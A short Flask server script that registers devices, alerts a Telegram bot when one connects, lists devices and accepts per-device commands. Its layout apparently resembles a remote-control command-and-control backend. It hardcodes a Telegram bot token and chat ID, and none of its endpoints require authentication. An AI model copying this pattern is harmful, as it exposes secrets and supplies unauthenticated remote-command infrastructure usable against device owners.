from flask import Flask, request, jsonify
import json
import os
import requests

app = Flask(__name__)
DEVICE_FILE = "devices.json"

BOT_TOKEN = "7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc"
CHAT_ID = "7554840326"

# Load devices from file
def load_devices():
    if os.path.exists(DEVICE_FILE):
        with open(DEVICE_FILE, "r") as f:
            return json.load(f)
    return {}

# Save devices to file
def save_devices(devices):
    with open(DEVICE_FILE, "w") as f:
        json.dump(devices, f)

devices = load_devices()

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    device_id = data.get("device_id")
    device_name = data.get("device_name")
    chat_id = data.get("chat_id")

    if device_id and device_name:
        devices[device_id] = {
            "device_name": device_name,
            "chat_id": chat_id
        }
        save_devices(devices)

        # Notify bot
        msg = f"✅ Device connected:\nName: {device_name}\nID: {device_id}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": msg
        })
        return jsonify({"status": "registered"}), 200

    return jsonify({"error": "Missing fields"}), 400

@app.route("/devices", methods=["GET"])
def get_devices():
    device_list = [
        {"device_id": k, "device_name": v["device_name"]}
        for k, v in devices.items()
    ]
    return jsonify({"devices": device_list}), 200

@app.route("/command", methods=["POST"])
def send_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    print(f"Command for {device_id}: {command}")
    return jsonify({"status": "sent"}), 200

# Run the server
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
